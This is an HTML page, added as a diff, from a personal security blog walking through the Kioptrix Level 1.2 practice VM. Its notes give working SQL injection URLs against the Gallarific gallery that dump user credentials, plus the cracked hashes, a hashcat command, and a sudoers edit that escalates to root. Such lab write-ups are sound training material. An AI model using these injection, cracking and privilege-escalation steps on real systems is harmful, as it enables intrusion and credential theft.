@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Kioptrix: Level 1.2 (#3) - (SQLi)</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link href="../../css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom CSS -->
+    <link href="../../css/one-page-wonder.css" rel="stylesheet">
+
+    <!-- HandDrawn Button CSS -->
+    <!-- <link rel="stylesheet" href="css/button/normalize.css"> -->
+    <link rel="stylesheet" href="../../css/button/style.css">
+    <link rel="stylesheet" href="../../cheat-assets/plugins/prism/prism.css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+
+<body>
+
+    <!-- Navigation -->
+    <nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+        <div class="container">
+            <!-- Brand and toggle get grouped for better mobile display -->
+            <div class="navbar-header">
+                <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+                    <span class="sr-only">Toggle navigation</span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </button>
+                <a class="navbar-brand" href="../../index.html">UB3RSEC</a>
+            </div>
+            <!-- Collect the nav links, forms, and other content for toggling -->
+            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+                <ul class="nav navbar-nav">
+                    <li>
+                        <a href="../main-page.html">Main</a>
+                    </li>
+                    <!-- <li>
+                        <a href="services.html">Services</a>
+                    </li> -->
+                    <li>
+                        <a href="../contact.html">Contact</a>
+                    </li>
+                </ul>
+            </div>
+            <!-- /.navbar-collapse -->
+        </div>
+        <!-- /.container -->
+    </nav>
+
+
+    <!-- Page Content -->
+    <div class="container">
+
+
+        <!-- First Featurette -->
+        <div class="featurette">
+            <!-- <img class="featurette-image img-circle img-responsive pull-right" src="http://placehold.it/500x500">  -->
+            <h2 class="featurette-heading">Kioptrix: Level 1.2 (#3) - (SQLi)
+                <!-- <span class="text-muted">Will Catch Your Eye</span> -->
+            </h2>
+            <p class="lead">
+                <p> As with the other two, this challenge is geared towards the beginner. It is however different. Added a few more steps and a new skill set is required. Still being the realm of the beginner I must add. The same as the others, there’s more then one way to “pwn” this one. There’s easy and not so easy. Remember… the sense of “easy” or “difficult” is always relative to ones own skill level. I never said these things were exceptionally hard or difficult, but we all need to start somewhere. And let me tell you, making these vulnerable VMs is not as easy as it looks… </p> 
+
+                <p>Important thing with this challenge. Once you find the IP (DHCP Client) edit your hosts file and point it to kioptrix3.com </p>
+
+                <p> Under Windows, you would edit C:\Windows\System32\drivers\etc\hosts to look something like this:</p>
+                <p># localhost name resolution is handled within DNS itself.</p>
+                <p>#   127.0.0.1 localhost</p>
+                <p>#   ::1 localhost127.0.0.1 static3.cdn.ubi.com</p>
+                <p>192.168.1.102 kioptrix3.com</p>
+                
+                <p>Under Linux that would be /etc/hosts</p>
+                <p>There’s a web application involved, so to have everything nice and properly displayed you really need to this.</p>
+
+           </p>
+
+            <a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3) VM Download</a><br>
+
+            <h2 class="title text-center">Walkthrough Video</h2><br>
+            <div align="center">
+                <video width="800" height="480" controls>
+                    <source src="../../videos/2016/kioptrix_level_3-sql.mp4" type="video/mp4">
+                    <!-- <source src="movie.ogg" type="video/ogg"> -->
+                    <!-- Your browser does not support the video tag. -->
+                </video>
+            </div>
+            <div class="block">
+                <h3 class="sub-title text-center">Notes</h3>
+                <div class="code-block">
+                    <pre><code class="language-markup">
+//add ip of kioptrix level 3 vm to /etc/hosts file
+192.168.216.132 kioptrix3.com
+
+//look at source of
+http://kioptrix3.com/gallery/gadmin/
+
+//gallarific is present on the webserver
+searchsploit Gallarific
+
+
+
+http://kioptrix3.com/gallery/gallery.php?id=null and 1=0 union select 1,concat(userid,0x3a,username,0x3a,password),3,4,5,6 from gallarific_users-- -
+1:admin:n0t7t1k4
+
+http://kioptrix3.com/gallery/gallery.php?id=null and 1=0 union select 1,column_name,3,4,5,6 from information_schema.columns where table_name='dev_accounts'-- -
+http://kioptrix3.com/gallery/gallery.php?id=null and 1=0 union select 1,concat(id,0x3a,username,0x3a,password),3,4,5,6 from dev_accounts-- -
+
+1:dreg:0d3eccfb887aabd50f243b3f155c0f85
+2:loneferret:5badcaf789d3d1d09794d8f021f40f0e
+
+//use either online service , john, hashcat for breaking md5
+
+#hashcat -m 0 -a0 file-containing-md5-hash /usr/share/wordlists/rockyou.txt
+
+5badcaf789d3d1d09794d8f021f40f0e:starwars
+0d3eccfb887aabd50f243b3f155c0f85:Mast3r
+
+// crackstation.net
+0d3eccfb887aabd50f243b3f155c0f85    md5 Mast3r   --> dreg
+5badcaf789d3d1d09794d8f021f40f0e    md5 starwars   --> loneferret
+
+//ssh to target machine with loneferret
+
+# sudo ht
+edit /etc/sudoers
+loneferret ALL=(ALL) ALL
+
+save and exit
+
+# sudo /bin/sh
+password: starwars
+
+#root :D
+
+                    </code></pre>
+                </div><!--//code-block-->
+            </div><!--//block-->
+        </div>
+
+        <!-- Footer -->
+        <footer>
+            <div class="row">
+                <div class="col-lg-12">
+                    <p>Copyright &copy; UB3RSiCK 2016</p>
+                </div>
+            </div>
+        </footer>
+
+    </div>
+    <!-- /.container -->
+
+
+
+
+    <!-- jQuery -->
+    <script src="../../js/jquery.js"></script>
+
+    <!-- Bootstrap Core JavaScript -->
+    <script src="../../js/bootstrap.min.js"></script>
+
+    <script type="text/javascript" src="../../cheat-assets/plugins/prism/prism.js"></script>
+</body>
+
+</html>
